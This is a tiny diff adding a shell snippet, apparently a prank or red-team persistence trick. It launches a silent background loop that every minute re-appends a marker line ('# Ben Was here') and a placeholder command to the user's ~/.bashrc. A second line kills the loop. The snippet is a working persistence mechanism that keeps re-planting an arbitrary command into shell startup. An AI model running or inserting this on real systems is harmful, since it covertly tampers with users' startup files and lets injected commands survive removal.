@@ -1,0 +1,4 @@
+nohup bash -c 'while true; do grep -q "# Ben Was here" ~/.bashrc || echo -e "# Ben Was here \n <INSERT COMMAND HERE>" >> ~/.bashrc; sleep 60; done' > /dev/null 2>&1 &
+
+# Kill the command
+pkill -f "bash -c while true;"
